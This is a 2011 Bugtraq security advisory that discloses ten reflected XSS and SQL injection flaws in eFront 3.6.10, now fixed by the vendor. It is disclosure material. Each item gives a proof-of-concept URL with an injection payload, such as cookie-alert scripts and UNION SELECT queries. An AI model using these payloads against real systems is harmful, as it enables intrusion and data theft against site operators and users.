
Date: Wed,  2 Nov 2011 12:18:40 +0100 (CET)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: Multiple vulnerabilities in Efront

Vulnerability ID: HTB23053
Reference: https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_efront.html
Product: Efront
Vendor: EPIGNOSIS Ltd ( http://www.efrontlearning.net/ ) 
Vulnerable Version: 3.6.10 build 11944  and probably prior
Tested Version: 3.6.10 build 11944 
Vendor Notification: 12 October 2011 
Vulnerability Type: XSS, SQL Injection
Status: Fixed by Vendor
Risk level: High 
Credit: High-Tech Bridge SA Security Research Lab ( https://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Efront, which can be exploited to perform sql injection and cross-site scripting attacks.

1) Input passed via the "course" GET parameter to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/index.php?ctg=lesson_info&lessons_ID=1&course=%27%20onmouseover%3dalert%28document.cookie%29%3E

2) Input appended to the URL after index.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site

The following PoC is available:

http://[host]/index.php/%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that Apache's directive "AcceptPathInfo" is set to "on" or "default" (default value is "default") 

3) Input passed via the "message_type" GET parameter to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/index.php?message=1&message_type=%22%20onmouseover=alert%28document.cookie%29%3E

4) Input passed via the "user2" GET parameter to ask_information.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/ask_information.php?common_lessons=1&user1=professor&user2=%27%20union%20select%201,version%28%29%20--%20

Successful exploitation of this vulnerability requires that "magic_quotes_gpc" is off.

5) Input passed via the "ctg" GET parameter to professor.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/professor.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29

6) Input passed via the "ctg" GET parameter to student.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/student.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29

7) Input passed via the "done_test_id" GET parameter to view_test.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/view_test.php?done_test_id=1%20union%20select%201,2,%28select%20version%28%29%29,4,5,6,7,8,9,10,11,12%20--%20

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.

8) Input passed via the "user" GET parameter to view_test.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/view_test.php?test_id=1&user=%27SQL_CODE_HERE
http://[host]/view_test.php?content_id=2&user=%27SQL_CODE_HERE

Successful exploitation of this vulnerability requires that "magic_quotes_gpc" is off.

9) Input passed via the "ctg" GET parameter to administrator.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/administrator.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29

10) Input passed via the "loglessonid" GET parameter to /modules/module_chat/admin.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/modules/module_chat/admin.php?force=getLessonFromId&loglessonid=-1%27%20union%20select%20version%28%29%20--%202

Successful exploitation of this vulnerability requires that "magic_quotes_gpc" is off.

Solution: Upgrade to the most recent version

Disclaimer: Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on the web page in Reference field.

